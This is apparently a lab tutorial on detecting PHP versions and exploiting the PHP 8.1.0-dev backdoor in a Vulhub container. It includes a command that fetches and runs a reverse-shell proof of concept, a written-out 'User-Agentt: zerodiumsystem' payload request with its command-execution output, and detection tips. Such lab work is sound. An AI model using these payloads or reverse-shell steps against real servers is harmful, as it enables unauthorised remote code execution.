# PHP Version Detection and Vulnerabilities

This guide walks through setting up **PHP-based vulnerable environments** using **VulnHub**, useful for testing and learning exploitation of real-world vulnerabilities.

> Lab reference: **Knife – HTB**

---

## PHP Version Detection

Use the following command to detect the PHP version running on a target server:

    curl -I http://<target-ip>:<port>/

#### Example

    curl -I http://10.10.10.242:80/

#### Output

    HTTP/1.1 200 OK
    Date: Fri, 18 Apr 2025 11:01:11 GMT
    Server: Apache/2.4.41 (Ubuntu)
    X-Powered-By: PHP/8.1.0-dev
    Content-Type: text/html; charset=UTF-8

- Using Nmap for PHP Version Detection

      nmap -p <port> --script http-php-version.nse <target-ip>

- Example

      nmap -v -sT -sV -A -O --script http-php-version.nse -p 80 10.10.10.242

### PHP 8.1.0-dev Backdoor Exploitation
Reference: VulnHub PHP 8.1.0-dev Backdoor

#### Docker Installation
Update and install Docker and Docker Compose:

    apt update
    apt install docker-compose docker -y

- Install Docker using the official script:

      curl -sSL https://get.docker.com | sh

-  Restart Docker service:

       systemctl restart docker

- Enable Docker at boot:

      systemctl enable docker

- Check Docker status:

      systemctl status docker

### Clone VulnHub and Build the Vulnerable Container
- Clone the VulnHub repository:

      git clone https://github.com/vulhub/vulhub.git

- Navigate to the PHP 8.1 backdoor directory:

      cd /opt/vulhub/php/8.1-backdoor/

- Build the Docker containers:

      docker-compose build

- Run the environment in the background:

      docker-compose up -d

### Port and Service Checks
Check if Docker or the vulnerable environment is listening on required ports:

    netstat -nltup | grep 5000
    netstat -nltup | grep docker

### Nmap Scanning
Basic Detection and Versioning Scan

    nmap -v -p 8080 -sT -sC -sV -A -O 192.168.1.103

### PHP Version Detection Using NSE Script

    nmap -v -p 8080 -sT -sV -A -O --script http-php-version.nse 192.168.1.103

### Exploitation Resources
- Exploit-DB:

      https://www.exploit-db.com/exploits/49933

- PoC Repository:

      https://github.com/fast101/php-8.1.0-dev-backdoor-rce

### Reverse Shell Exploitation
Download the reverse shell PoC:

    wget https://raw.githubusercontent.com/fast101/php-8.1.0-dev-backdoor-rce/main/revshell_php_8.1.0-dev.py
View usage options:

    python revshell_php_8.1.0-dev.py -h

Run the reverse shell attack:

    python revshell_php_8.1.0-dev.py http://192.168.1.23:8080/ 192.168.1.7 443

### Malicious Request

    GET / HTTP/1.1
    Host: 192.168.1.28:8080
    Accept-Language: en-GB,en;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
    User-Agentt: zerodiumsystem("uname -a");
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive

### Observed Response

    HTTP/1.1 200 OK
    Host: 192.168.1.28:8080
    Date: Mon, 21 Apr 2025 10:54:41 GMT
    Connection: close
    X-Powered-By: PHP/8.1.0-dev
    Content-Type: text/html; charset=UTF-8

    Linux 1249b712bf95 6.1.0-32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.129-1 (2025-03-06) x86_64 GNU/Linux
    hello world

### Analysis
- The backdoored PHP binary interprets headers starting with User-Agent (e.g. User-Agentt) as executable PHP code.

- The payload zerodiumsystem("uname -a"); executes the uname -a command on the server.

- The response shows raw command output, confirming Remote Code Execution (RCE).

### Recommendation for Detection
1. Monitor for unusual HTTP headers like User-Agentt, X-Cmd, or non-standard headers.

2. Look for suspicious PHP versions such as PHP/8.1.0-dev in the X-Powered-By header.

3. Use traffic inspection tools like:

- tcpdump
- Wireshark
- Suricata

### Cleanup
Stop and remove containers and volumes:

    docker-compose down -v
## CVE-2019-11043 – PHP-FPM Remote Code Execution
This CVE affects PHP-FPM under certain Nginx configurations.

Reference: VulnHub CVE-2019-11043

### Environment Setup
Navigate to the relevant directory:

    cd /opt/vulhub/php/CVE-2019-11043

Build the containers:

    docker-compose build
